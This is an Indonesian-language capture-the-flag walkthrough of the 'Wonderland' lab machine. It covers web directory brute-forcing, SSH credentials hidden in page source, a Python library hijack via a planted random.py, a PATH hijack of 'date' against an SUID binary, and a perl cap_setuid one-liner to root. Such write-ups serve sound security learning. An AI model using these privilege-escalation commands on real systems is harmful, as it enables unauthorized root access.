# Wonderland

```
target: 10.10.174.70
```

Lakukan scanning seperti biasa
```bash
rustscan -a 10.10.174.70 -- -A | tee zcan-rust
...
...
Open 10.10.174.70:80
Open 10.10.174.70:22
...
```

Jika kita buka webnya di `http://10.10.174.70`, maka akan muncul index yang memberikan hint "Follow the white rabbit". Karena itu, disini langsung saja kita coba brute-force webdir
```bash
dirsearch -u http://10.10.174.70 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
...
...
301 -    0B  - /r  ->  r/
...
```
Jika kita pergi ke `http://10.10.174.70/r`, maka akan muncul index yang memberikan hint lagi dengan "Keep Going.". Dari sini saya mulai curiga, dan mencoba untuk menambahkan per huruf pada setiap direktori, sehingga menjadi `http://10.10.174.70/r/a/b/b/i/t`, dan hasilnya adalah benar. Kita akan mendapat index dengan hint "Open the door and enter wonderland", dan jika kita membuka source-code nya, kita akan mendapat creds ssh untuk user alice
```html
...
...
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisXXXXXXX</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
...
```
dan ketika kita gunakan untuk login, berhasil.

Setelah login, ternyat akita mendapat user alice. Ketika dicek dengan `id` alice tidak termasuk group apapun, namun ketika dicek dengan `sudo -l`, kita mendapat informasi
```bash
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
alice dapat run script tersebut sebagai user `sudo -u rabbit`. Jika kita coba run script tersebut dengan cara
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
maka akan menghasilkan random words. Kita dapat mulai investigasi isinya isinya, kita mendapati bawha script ini:
    - melakukan import library `random`
    - script ini akan mengambil 10 line kalimat secara random dari variable `poem`

Dari hal ini, kita dapat ketahui bahwa ketika kita execute script, script akan mengambil library yang diperlukan untuk randomize line, dan library ini di store di suatu direktori. Untuk cek direktori nya, kita dapat menggunakan command berikut
```bash
python3 -c "import sys;print(sys.path)"
...
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```
dapat dilihat, bahwa library berada di `/usr/lib/python3.6`, kita dapat pastikan lagi dengan
```bash
locate random.py
...
/usr/lib/python3.6/random.py
```
Jika dari banyaknya path tersebut merupakan world writeable, maka hal tersebut dapat memicu adanya privesc, hal ini karena menempatkan file dengan nama yang sama akan memicu untuk load malicious file tersebut ketika direquest oleh script yang akan di run. Dalam hal ini, terdapat `''` didalam hasil dari pencarian direktori library. Hal itu menunjukkan current directory kita, jika kita membuat file yang sama di current directory, maka file yang kita buat yang akan di load daripada library yang sebenarnya. Untuk itu, kita buat file baru
```bash
vim random.py
...
import os
os.system("/bin/bash")
```
selanjutnya kita jalankan file tersebut
```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
[sudo] password for alice: 
rabbit@wonderland:~$ whoami
rabbit
```
kita akan otomatis privesc secara horizontal ke user rabbit karena file random.py yang di load adalah file yang barusan kita buat dan ada di direktori saat kita run script tersebut. Setelah menjadi user rabbit, jika kita lihat di home, kita mendapati suid file dengan nama `teaParty`, ketika di run, akan menghasilkan output seperti berikut
```bash
./teaParty
...
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 23 Jan 2024 09:26:20 +0000
Ask very nicely, and I will give you some tea while you wait for him
test
Segmentation fault (core dumped)
```

**BUFFER OVERFLOW?????** :( ini kelemahan saya huhuhu. Tapi tidak papa, kita search di internet :D. Sebelumnya, kita copy dulu file tersebut ke local. Selanjutnya kita buat menjadi executable dengan cara `chmod +x teaParty` masuk ke `ghidra` untuk analisa file binary tersebut. Setelahnya kita akan mendapat code ini ketika kita pergi ke main function
```c
void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
Disini setelah saya lihat code di main function, saya belum tahu apa yang aneh dan menurut saya normal saja, selain itu `puts();` digunakan untuk selalu menampilkan Segmentation fault langsung setelah kita memberikan input. Ternyata tidak ada buffer overflow :D, tapi saya masih bingung :(.

Akhirnya setelah mencari lebih dalam, saya mendapat jawaban bahwa binary ini memanggil program yang sudah dimiliki oleh system seperti `echo` dan `date`. Yang mana, `echo` terdefine secara jelas berada di `/bin/echo` sedangkan `date` tidak, jadi binary ini menggunkaan linux PATH untuk mencari program yang dimiliki oleh sistem. Oleh karena itu kita bisa memanfaatkan hal ini untuk menggiringnya ke direktori dan file lain :D. Kita akan membuat file bernama `date` di `/tmp` direktori dengan isi seperti berikut
```bash
#!/bin/bash
/bin/bash
```
Selanjutnya kita tambahkan dir `/tmp` ke PATH linux dengan cara
```bash
export PATH=/tmp:$PATH
echo $PATH
...
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
Jika hasil nya sudah ada `/tmp` di PATH, maka kita bisa langsung eksekusi program `teaParty` tersebut
```
rabbit@wonderland:/tmp$ /home/rabbit/teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/tmp$ whoami
hatter
```
dan kita berhasil privesc ke user hatter. Setelah itu kita coba cek isi homenya, ternyata kita mendapat password dari user hatter
```bash
cat password.txt
...
WhyIsAXXXXLikeAXXXXDesk?
```
Kita bisa langsung login ssh dengan creds tersebut.
Jika sudah, untuk mempercepat enumerasi, disini saya menggunakan linpeas :D. Dan dari hasil run linpeas, saya mendapat hal yang menarik
```bash
...
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

╔══════════╣ Users with capabilities
...
```
Ternyata terdapat CAP_SETUID di `perl`, kita dapat mencarinya di [gtfobin](gtfobins.github.io), dan ketemu, payload untuk exploit `perl` dengan kapabilitas setuid
```bash
...
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
Jika kita jalankan payload tersebut, maka kita akan bisa privesc vertikal ke root user dan mendapatkan semua flagnya. `user.txt` terdapat di `/root/` dan `root.txt` terdapat di `/home/alice`

